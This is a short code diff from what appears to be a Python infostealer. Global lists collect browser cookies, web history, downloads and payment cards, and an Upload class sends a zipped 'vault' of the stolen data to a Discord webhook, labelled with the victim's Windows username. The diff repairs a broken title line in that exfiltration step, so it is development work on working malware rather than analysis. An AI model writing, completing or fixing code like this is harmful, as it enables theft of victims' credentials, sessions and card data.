@@ -15,7 +15,6 @@ __COOKIES__ = []
 __WEB_HISTORY__ = []
 __DOWNLOADS__ = []
 __CARDS__ = []
-username = os.getenv('USERNAME')
 class Browsers:
     def __init__(self, webhook):
         self.webhook = SyncWebhook.from_url(webhook)
@@ -61,7 +60,7 @@ class Upload:
     def send(self):
         self.webhook.send(
             embed=Embed(
-                title="forvault" {username} value=username,
+                title="log from's " + os.getenv('USERNAME'),
                 description="```" + '\n'.join(self.tree(Path("vault"))) + "```",
             ),
             file=File("vault.zip"),
